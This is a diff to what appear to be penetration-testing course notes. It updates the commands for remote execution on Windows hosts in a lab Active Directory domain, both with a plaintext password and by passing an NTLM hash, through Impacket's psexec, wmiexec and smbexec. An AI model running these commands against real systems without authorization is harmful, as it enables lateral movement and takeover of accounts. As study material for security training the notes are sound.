@@ -482,12 +482,12 @@ Metasploit - with hash
   - `show targets` can be useful
 
 psexec.py - with password
-- `psexec.py marvel.local/fcastle:'P@$$w0rd!'@xxx.xxx.xxx.xxx`
+- `impacket-psexec marvel.local/fcastle:'P@$$w0rd!'@xxx.xxx.xxx.xxx`
 
 psexec.py - with hash
-- `psexec.py administrator@xxx.xxx.xxx.xxx -hashes LM:NT`
+- `impacket-psexec administrator@xxx.xxx.xxx.xxx -hashes LM:NT`
 
-Alternatives to `psexec.py`, use `wmiexec.py` or use `smbexec.py`.
+Alternatives to `psexec`, use `wmiexec` or use `smbexec`.
 
 #### IPv6 attacks
 
